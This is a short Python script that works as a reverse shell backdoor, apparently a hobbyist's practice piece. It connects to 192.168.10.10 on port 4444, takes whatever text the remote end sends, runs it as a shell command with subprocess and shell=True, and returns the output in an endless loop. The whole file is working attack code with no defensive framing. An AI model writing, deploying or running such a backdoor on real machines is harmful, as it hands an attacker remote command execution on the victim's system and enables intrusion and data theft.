#!usr/bin/env python

import subprocess
import socket


ip = "192.168.10.10"

def exe_sys_command(command):
    return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection.connect((ip,4444))

while True:
    recieved_data = connection.recv(1024)
    command = exe_sys_command(recieved_data.decode())
    connection.send(command)

connection.close()